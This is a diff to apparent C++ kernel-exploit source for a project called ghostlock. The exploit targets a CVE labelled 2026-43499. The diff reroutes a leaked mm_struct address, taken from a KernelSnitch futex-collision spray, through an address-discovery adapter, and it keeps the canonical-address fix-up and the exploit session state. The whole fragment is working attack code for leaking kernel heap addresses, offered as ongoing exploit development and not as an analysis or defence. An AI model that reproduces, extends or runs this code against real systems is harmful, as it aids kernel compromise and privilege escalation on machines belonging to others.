@@ -5,7 +5,7 @@
 #include "memory/constants.hpp"
 #include "memory/offset.h"
 
-#include "kernelsnitch/utils.h"
+#include "support/log.hpp"
 #include "support/decls.hpp"
 #include "support/time.h"
 #include "memory/heap_context.h"
@@ -24,11 +24,12 @@
 #include "session/core_session.hpp"
 #include "support/native_resource.hpp"
 #include "memory/target.h"
-#include "kernelsnitch/kernelsnitch.h"
-/* A3: mounts the optional contract::AddressDiscoveryOps adapter on the one TU
- * that already owns kernelsnitch.h; the live spray keeps its existing path in
- * this batch, so this only keeps the adapter compiled/lint-checked. */
-#include "kernelsnitch/address_discovery.h"
+/* A3-2: the kernelsnitch provider moved to the 43499 leak module. Its adapter
+ * header includes kernelsnitch.h, so this single include keeps both the provider
+ * and the optional contract::AddressDiscoveryOps adapter compiled on the sole
+ * TU that owns the provider. The live spray keeps its existing path in this
+ * batch. */
+#include "backend/cve_2026_43499/leak/address_discovery.h"
 
 /* Session aliases kept from the preprocessor era: the attack statements were
  * written with these short names, and references preserve every call site
@@ -634,12 +635,25 @@ namespace ghostlock::support {
 
         pr_info("[spray] futex collisions found +%lldms\n",
                 ms_since(&t_spray));
-        (void) snitch.scan();
+        /* A3-2 item 3: resolve the leaked mm_struct through the fail-closed
+         * contract handle instead of reading the KernelSnitch provider directly.
+         * The adapter already restores the canonical VA (mm_struct | 0xf << 56)
+         * and, on failure, writes the canonical all-zero result. This consumer is
+         * the compatibility boundary: mapping ok == false back to the legacy
+         * ~(uintptr_t)0 sentinel keeps the failure log, the stored last_mm_struct
+         * and the direct-map guard below in their exact pre-A3-2 shape while the
+         * contract itself stays fail-closed. */
+        ghostlock::contract::AddressDiscoveryResult discovery{};
+        const ghostlock::contract::AddressDiscoveryOps discovery_ops =
+                kernelsnitch::address_discovery_ops(snitch.get());
+        if (discovery_ops.available()) {
+            (void) discovery_ops.discover(discovery_ops.ctx, &discovery);
+        }
+        const uintptr_t leaked = discovery.ok
+                                         ? static_cast<uintptr_t>(discovery.mm_struct)
+                                         : static_cast<uintptr_t>(-1);
         pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
-                snitch.result(), ms_since(&t_spray));
-        uintptr_t leaked = snitch.result();
-        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
-        leaked |= static_cast<uintptr_t>(0xf) << 56;
+                leaked, ms_since(&t_spray));
         (ghostlock::backend::cve43499_state(session::g_exploit_session).heap.current.last_mm_struct) = leaked;
         /* mm_structs live in the direct map */
         if (leaked == static_cast<uintptr_t>(-1) ||
